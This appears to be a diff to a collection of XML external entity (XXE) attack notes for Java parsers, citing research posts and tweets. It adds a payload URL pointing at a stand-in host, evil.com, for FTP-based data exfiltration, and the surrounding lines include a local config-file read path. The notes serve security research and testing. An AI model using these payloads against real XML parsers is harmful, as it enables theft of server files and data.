@@ -209,3 +209,5 @@ https://blog.netspi.com/forcing-xxe-reflection-server-error-messages/
 https://twitter.com/Agarri_FR/status/595598007996919808 "Use %payload;://xxx as the final URL for inline leak via error messages (Java, at least)" "I used that trick last week: dynamic DTD w/o OOB leak (very uncommon), no data outside of attributes, verbose Java parser"
 https://twitter.com/Agarri_FR/status/659182619796574209 "Under Java, FileInputStream will refuse to open "/" and "file:/" (they are directories). But "netdoc:/" is OK"
 file:///proc/self/cwd/../config/ # Java
+file://evil.com:123/ # Java exfil via ftp https://immunityservices.blogspot.com/2021/02/misconfigurations-in-java-xml-parsers.html
+
